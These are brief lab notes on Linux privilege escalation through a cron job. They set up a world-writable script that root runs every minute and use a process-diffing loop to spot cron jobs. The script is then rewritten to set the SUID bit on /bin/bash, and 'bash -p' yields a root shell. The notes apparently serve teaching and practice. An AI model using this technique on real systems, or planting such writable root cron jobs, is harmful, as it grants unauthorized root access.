### cron
```bash
apt install cron -y
service cron start
crontab -e

* * * * * /bin/bash/ /tmp/script.sh

cd tmp
nano script.sh

#!/bin/bash
whoami > /tmp/output.txt

chmod +x script.sh
chmod o+w script.sh

su s4vitar

# Detect cron jobs
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh

ps -eo user,command

```
```bash
#!/bin/bash
# procmon.sh

old_process=$(ps -eo user,command)

while true; do
    new_process=$(ps -eo user,command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done

```
```bash
#!/bin/bash
### script.sh

sleep 2
chmod u+s /bin/bash

```
```bash
bash -p

# pspy


```